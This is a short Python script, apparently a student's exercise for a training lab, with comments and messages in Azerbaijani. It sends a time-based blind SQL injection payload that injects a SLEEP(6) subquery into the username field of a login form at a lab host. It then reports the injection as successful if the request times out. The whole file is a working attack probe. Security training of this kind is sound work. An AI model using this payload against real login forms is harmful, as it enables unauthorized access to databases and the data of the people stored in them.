import requests
import time

url = "http://web0x01.hbtn/a3/sql_injection/"
# Login formasının post ünvanı və ya eyni səhifə üzrə POST sorğusu
payload = "admin' AND (SELECT 1 FROM (SELECT(SLEEP(6)))a)--"

print("POST sorğusu göndərilir...")
start = time.time()
try:
    res = requests.post(url, data={"username": payload, "password": "123"}, timeout=10)
    print(f"Müddət: {time.time() - start:.2f} saniyə")
except requests.exceptions.Timeout:
    print("[+] UĞURLU! POST sorğusunda Timeout baş verdi (Gecikmə işlədi!).")
